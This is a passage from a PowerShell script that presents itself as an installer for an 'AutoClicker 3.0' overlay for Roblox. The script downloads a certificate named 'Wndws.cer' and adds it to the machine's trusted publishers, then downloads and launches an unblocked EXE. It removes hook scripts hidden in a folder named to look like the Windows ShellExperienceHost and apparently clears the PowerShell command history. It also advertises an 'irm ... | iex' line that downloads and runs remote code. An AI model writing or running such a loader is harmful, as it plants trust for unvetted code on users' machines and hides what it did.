        throw "Replace verification failed for $Destination (expected $size bytes, got $installedSize)."
    }
}

function Stop-PublicAutoClicker {
    Get-Process -Name 'AutoClicker-3.0' -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 120
}

function Test-PublicOverlayStarted {
    Add-Type @'
using System;
using System.Runtime.InteropServices;
public class PublicOverlayProbe {
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
'@ -ErrorAction SilentlyContinue

    for ($i = 0; $i -lt 8; $i++) {
        $hwnd = [PublicOverlayProbe]::FindWindow('AutoClickerOverlay', $null)
        if ($hwnd -eq [IntPtr]::Zero) {
            $hwnd = [PublicOverlayProbe]::FindWindow('Windows.UI.Core.CoreWindow', $null)
        }
        if ($hwnd -ne [IntPtr]::Zero) {
            Write-Step 'AutoClicker overlay detected.' 'Green'
            return $true
        }
        Start-Sleep -Milliseconds 200
    }
    Write-Step 'AutoClicker started - open Roblox and use Insert after the license screen.' 'Yellow'
    return $false
}

Write-Host ''
Write-Host '  AutoClicker 3.0 (EXE only)' -ForegroundColor White
Write-Host ''

$script:InstallExitCode = 0

try {
Enable-MystInstallerWeb

$sacState = Get-SmartAppControlState
if ($sacState -eq 'On') {
    Write-Step 'Smart App Control is ON - self-signed apps may be blocked until SAC is off or you run as Admin.' 'Yellow'
}

Remove-LegacyMystDirectory
Remove-LegacyHostDll
Ensure-InstallDirectory -Path $InstallDir

$cerPath = Join-Path $env:TEMP 'Wndws.cer'
$exePath = Join-Path $InstallDir $script:ExeName

Stop-PublicAutoClicker

Save-Download -Url $script:CerUrl -Destination $cerPath
Install-WndwsTrustedPublisher -CerPath $cerPath

Save-Download -Url $script:ExeUrl -Destination $exePath -MinBytes 65536 -StopProcessNames @('AutoClicker-3.0')
Unblock-File -LiteralPath $exePath -ErrorAction SilentlyContinue

$signature = Test-WndwsSignedExecutable -Path $exePath
Write-Step "Verified signed EXE: $($signature.SignerCertificate.Subject) ($($signature.Status))" 'Green'
    Write-Step "Installed: $exePath" 'Green'

if (-not $SkipLaunch) {
    Write-Step 'Starting AutoClicker 3.0...' 'Cyan'
    Start-Process -FilePath $exePath -WorkingDirectory $InstallDir
    Test-PublicOverlayStarted | Out-Null
}

$legacyHookDir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\ShellExperienceHost'
if ($legacyHookDir) {
    foreach ($artifact in @('ShellExperienceHost.ps1', 'loc-install-hooks.ps1', 'loc-hook.ps1', '.wshost', 'loc-arm')) {
        $artifactPath = Join-Path $legacyHookDir $artifact
        if (Test-Path -LiteralPath $artifactPath) {
            Remove-Item -LiteralPath $artifactPath -Force -ErrorAction SilentlyContinue
        }
    }
}

Write-Host ''
Write-Host '  AutoClicker installed and running.' -ForegroundColor Green
Write-Host '  Press END in-game to fully close AutoClicker.' -ForegroundColor Green
Write-Host '  Diagnostics + install: irm https://raw.githubusercontent.com/JustValkz/Myst/main/myst-diagnose.ps1 | iex' -ForegroundColor DarkGray
Write-InstallPaths -ExePath $exePath

} catch {
    Write-Host ''
    Write-Host "  Install failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host '  If Smart App Control is on, run PowerShell as Administrator once.' -ForegroundColor DarkGray
    Write-Host '  Or trust the Wndws certificate manually, then re-run the install command.' -ForegroundColor DarkGray
    $script:InstallExitCode = 1
} finally {
    try {
        Complete-PSReadLineSession -FullPass -SkipLogs | Out-Null
    } catch {}
    if ($script:InstallExitCode -ne 0) {
        Wait-MystInstallPause -Failed -ExitCode $script:InstallExitCode
    }
    if ($script:InstallExitCode -ne 0) {
        exit $script:InstallExitCode
    }
}
